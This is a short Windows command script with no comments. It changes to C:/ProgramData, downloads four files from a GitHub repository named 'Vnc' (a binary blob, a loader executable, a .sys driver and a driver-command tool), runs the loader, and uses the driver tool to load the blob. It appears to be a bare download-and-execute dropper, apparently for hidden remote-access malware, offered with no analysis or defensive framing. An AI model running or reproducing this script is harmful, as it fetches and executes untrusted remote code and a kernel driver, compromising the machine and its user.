cd C:/ProgramData
curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/Cdll.bin
curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/loader.exe
curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/CEsys.sys
curl -O https://raw.githubusercontent.com/CodeBlog-x64/Vnc/main/DrvCom.exe
loader
DrvCom -f c:\ProgramData\Cdll.bin
exit

